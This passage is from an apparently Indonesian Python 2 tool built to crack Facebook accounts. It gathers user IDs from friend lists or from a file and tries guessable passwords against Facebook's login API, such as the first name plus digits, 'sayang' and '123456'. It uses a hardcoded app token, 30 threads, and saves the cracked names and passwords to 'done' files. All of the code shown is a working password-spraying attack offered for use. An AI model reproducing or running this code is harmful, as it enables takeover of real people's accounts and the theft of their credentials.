                    cek = open('done/malay.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/malay.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;91m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;91m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;91m' + bos3
                        cek = open('done/malay.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = 'sayang'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            oke = open('done/malay.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos4
                            cek = open('done/malay.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Malaysia'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                oke = open('done/malay.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos5
                                cek = open('done/malay.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    oke = open('done/malay.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos6
                                    cek = open('done/malay.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = '12345678'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        oke = open('done/malay.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos7
                                        cek = open('done/malay.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'asmara'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            oke = open('done/malay.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos8
                                            cek = open('done/malay.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSelesai ...'
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;91m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone malay.'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    raw_input('\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m} ')
    os.system('python2 d4rk.py')


def crack_bangla():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;37m{\x1b[1;33m01\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Daftar Teman'
    print '\x1b[1;37m{\x1b[1;33m02\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari Publik/Teman'
    print '\x1b[1;37m{\x1b[1;33m03\x1b[1;37m}\x1b[1;37m\x1b[1;37m Crack Dari File'
    print '\x1b[1;37m{\x1b[1;31m00\x1b[1;37m}\x1b[1;37m\x1b[1;37m Kembali'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    pilih_bangla()


def pilih_bangla():
    teak = raw_input('\x1b[1;33mPilih \x1b[1;31m:\x1b[1;37m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang !'
        pilih_bangla()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    elif teak == '2' or teak == '02':
        os.system('clear')
        print logo
        print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
        idb = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m ID Target \x1b[1;91m:\x1b[1;97m ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idb + '?access_token=' + toket)
            sp = json.loads(pok.text)
            print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m Nama Akun \x1b[1;91m:\x1b[1;97m ' + sp['name']
        except KeyError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID publik tidak ada !'
            raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            crack_bangla()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi !'
            keluar()

        r = requests.get('https://graph.facebook.com/' + idb + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])

    else:
        if teak == '3' or teak == '03':
            os.system('clear')
            print logo
            try:
                print '             \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK BANGLADESH \x1b[1;91m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m}\x1b[1;97m Nama File \x1b[1;91m:\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada ! '
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
            except IOError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File tidak ada !'
                raw_input('\n\x1b[1;97m{\x1b[1;91mKembali\x1b[1;97m}')
                crack_bangla()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Isi Yg Benar Sayang !'
            pilih_bangla()
        print '\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m{\x1b[0;91m\xc3\x97\x1b[0;97m} Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\x1b[1;97m\x1b[1;41;97m\nTidak Ada Hasil Gunakan Mode Pesawat 5 Detik\x1b[0m'
    print '\x1b[1;34m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                oke = open('done/bangla.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos1
                cek = open('done/bangla.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    oke = open('done/bangla.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos2
                    cek = open('done/bangla.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        oke = open('done/bangla.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m{\x1b[1;91m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;97m' + bos3
                        cek = open('done/bangla.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '786786'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
